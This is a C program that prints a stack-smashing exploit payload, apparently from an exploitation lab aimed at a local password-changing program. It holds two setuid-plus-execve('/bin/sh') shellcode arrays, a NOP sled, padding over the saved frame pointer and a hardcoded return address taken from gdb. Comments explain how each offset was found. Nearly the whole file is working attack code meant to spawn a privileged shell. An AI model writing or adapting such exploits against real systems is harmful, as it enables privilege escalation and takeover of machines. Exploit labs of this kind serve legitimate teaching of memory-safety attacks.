#include <stdio.h>
#include <stdlib.h>
#include <string.h>

const char theircode[] = {
	"\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68"
	"\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
	"\x0"
};

/* This code is the compiled version of shellcode.s:
 * Just compile it and take the bytes from objdump -d shellcode */
const char ourcode[] = {
	// _start
	"\x48\x31\xc0"
	"\xb0\x46"
	"\x48\x31\xdb"
	"\x48\x31\xc9"
	"\xcd\x80"
	"\xeb\x1b"
	// prep_string
	"\x5b"
	"\x48\31\xc0"
	"\x88\x43\x07"
	"\x48\x89\x5b\x08"
	"\x48\x89\x43\x10"
	// call_execve
	"\xb0\xff"
	"\x2c\xf4"
	"\x48\x8d\x4b\x08"
	"\x48\x8d\x53\x10"
	"\xcd\x80"
	// put_addr_on_stack
	"\xe8\xe0\xff\xff\xff"
	// string
	"/bin/shN"
	"AAAAAAAA"
	"BBBBBBBB"
	"\x0"
};



int
main( void )
{
	const char *shellcode = ourcode;

	/* This is the address on the stack to where we want to jump:
	 * We get this address from gdb, simply &passwd. */
	const char *addr = { "\xd0\xdf\xff\xff\xff\x7f\x00\x00" };

	/* This number of bytes is extracted from the disassembly of main:
	 * Just in the start the main function allocates the memory for local 
	 * variables by modifying %rsp. */
	size_t stack_size = 0x100;
	stack_size -= 0x80; // We don't care about newpass, it's "before" anyway
	stack_size -= strlen( shellcode );

	/* Start the outputs:
	 * It's easier to hit the right spot if we pad with NOPs first. Then we 
	 * want to hit the stored value for %ebp and finally the return pointer. */

	/* padding: NOPs */
	for ( size_t i = 0; i < stack_size; i++ )
		putchar( 0x90 );

	/* executable code */
	for ( size_t i = 0; i < strlen( shellcode ); i++ )
		putchar( shellcode[i] );

	/* Stored %rbp:
	 * We don't care, it'll never be used again anyway.  We only care that it's 
	 * 8 bytes on our system.  Check this with "x/100x $rsp" in gdb.  Look at 
	 * the addresses of "&passwd" and "$rbp". */
	for ( size_t i = 0; i < 8; i++ )
		putchar( 0x90 );

	/* return address */
	for ( size_t i = 0; i < strlen( addr ); i++ )
		putchar( addr[i] );

	return 0;
}
